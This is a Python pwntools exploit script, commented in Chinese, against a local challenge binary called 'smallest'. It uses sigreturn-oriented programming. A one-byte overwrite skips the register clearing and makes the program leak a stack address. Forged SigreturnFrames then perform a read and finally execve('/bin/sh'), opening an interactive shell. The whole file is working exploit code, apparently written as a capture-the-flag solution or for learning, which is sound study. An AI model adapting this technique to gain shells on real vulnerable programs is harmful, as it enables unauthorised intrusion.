from pwn import *

small = ELF('./smallest')
r = process('./smallest')
context(arch = 'amd64', os = 'linux')

def lg(buf):
    log.success(f'\033[33m{buf}:{eval(buf):#x}\033[0m')

syscall_ret = 0x4000BE #源代码syscall处地址
start_addr = 0x4000B0  #源代码xor rax,rax处地址

payload = p64(start_addr) * 3  #部署三个start_addr，完成三次read函数的调用
r.send(payload)

#覆盖第二个start_addr的最后一个字节变成0x00000000004000B3，
#越过对rax寄存器的清零，还使得rax寄存器值变为1
r.send('\xb3')  
stack_addr = u64(r.recv()[8:16]) #程序调用write函数，使用recv模块接收接下要要部署的栈顶地址
lg("stack_addr")

read = SigreturnFrame()
read.rax = constants.SYS_read #read函数系统调用号
read.rdi = 0  #read函数一参
read.rsi = stack_addr  #read函数二参
read.rdx = 0x400  #read函数三参
read.rsp = stack_addr  #和rsi寄存器中的值保持一致，确保read函数写的时候rsp指向stack_addr
read.rip = syscall_ret #使得rip指向syscall的位置，在部署好read函数之后能直接调用
payload = p64(start_addr) + p64(syscall_ret) + bytes(read)
r.send(payload)
r.send(payload[8:8+15])

execve = SigreturnFrame()
execve.rax = constants.SYS_execve
# "/bin/sh"字符串地址，这里为了能够让exp3.1正常执行，所以直接给了0x120，下面会将为什么是0x120
execve.rdi = stack_addr + 0x120  
execve.rsi = 0x0 #execve函数二参
execve.rdx = 0x0 #execve函数二参
execve.rsp = stack_addr 
execve.rip = syscall_ret

payload_exe = p64(start_addr) + p64(syscall_ret) + bytes(execve)
len_payload_exe = len(payload_exe)
lg("len_payload_exe")

payload = payload_exe.ljust(0x120,b'\x00') + b'/bin/sh\x00'
r.send(payload)
r.send(payload[8:8+15])

r.interactive()
